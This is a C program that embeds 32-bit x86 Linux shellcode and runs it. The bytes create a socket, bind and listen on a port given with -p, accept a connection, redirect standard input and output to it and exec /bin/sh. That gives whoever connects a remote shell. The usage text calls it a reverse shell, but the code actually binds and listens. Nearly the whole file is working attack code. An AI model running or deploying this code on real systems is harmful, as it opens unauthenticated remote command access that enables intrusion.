
#include <stdio.h>
#include <string.h>
#include <getopt.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

unsigned char shellcode[] = \
	"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x6a\x01\x6a\x02"
	"\x89\xe1\xcd\x80\x97\xb0\x66\x6a\x02\x5b\x52\x66"
	"\x68\xAA\xAA\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57"
	"\x89\xe1\xcd\x80\xb0\x66\x6a\x04\x5b\x52\x57\x89"
	"\xe1\xcd\x80\xb0\x66\x6a\x05\x5b\x52\x52\x57\x89"
	"\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49"
	"\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x54\x5b\x89\xd1\xcd\x80";

void print_usage() {
    printf("Usage: ./reverse -p PORT\n");
 
    exit(EXIT_SUCCESS);
}

int main(int argc, char ** argv)
{

  int opt, i;
  __uint16_t port;
 
  if (argc != 3) 
  	print_usage();
	  
  while ((opt = getopt (argc, argv, "p:")) != -1) {
  	switch (opt) {
		case 'p':

      			port = atoi(optarg);

			shellcode[26] = port & 0xff;
			shellcode[25] = (port >> 8) & 0xff;

       		        break;
	}
  }

  printf("Shellcode length: %d\n", strlen(shellcode));

  int (*ret)() = (int(*)()) shellcode;

  ret();
}

